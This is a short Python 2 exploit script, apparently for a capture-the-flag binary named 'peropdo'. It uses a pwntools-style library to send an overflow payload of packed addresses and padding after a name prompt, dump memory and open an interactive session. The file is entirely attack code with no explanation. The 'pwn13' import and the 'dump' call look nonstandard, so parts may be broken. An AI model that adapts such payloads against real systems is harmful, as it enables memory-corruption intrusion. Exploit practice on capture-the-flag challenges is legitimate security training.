#!/usr/bin/python
from pwn13 import *


p = process("./peropdo")

print p.recvuntil("name?\n")
payload = p32(0x211a922)
payload += p32(0x41414141)*29 + 'A'
payload += p32(0x61616161)
p.sendline(payload)
p.dump(0x80ecfb0,0x100)
p.interactive()

p.close()
